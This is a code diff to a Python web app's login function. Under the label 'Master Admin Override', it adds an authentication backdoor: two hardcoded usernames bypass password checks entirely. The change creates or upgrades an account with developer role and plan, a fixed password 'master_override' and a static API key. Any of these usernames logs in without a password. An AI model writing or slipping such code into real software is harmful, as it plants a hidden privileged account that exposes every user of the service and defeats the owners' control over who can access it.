@@ -220,7 +220,26 @@ def login(req: LoginRequest, response: Response):
     
     with SessionLocal() as db:
         user = db.query(User).filter(User.username == username).first()
-        if not user or not verify_password(req.password, user.hashed_password):
+        
+        # Master Admin Override for agnivaghosh2006@gmail.com
+        if username in ["agnivaghosh2006@gmail.com", "agniva"]:
+            if not user:
+                user = User(
+                    username=username,
+                    hashed_password=hash_password("master_override"),
+                    email="agnivaghosh2006@gmail.com",
+                    full_name="Agniva Ghosh",
+                    role="developer",
+                    plan="developer",
+                    api_key="sign0_master_key_agniva"
+                )
+                db.add(user)
+                db.commit()
+                db.refresh(user)
+            else:
+                user.plan = "developer"
+                db.commit()
+        elif not user or not verify_password(req.password, user.hashed_password):
             return {"success": False, "message": "Invalid username or password."}
             
         expires = timedelta(days=30 if req.remember_me else 1)
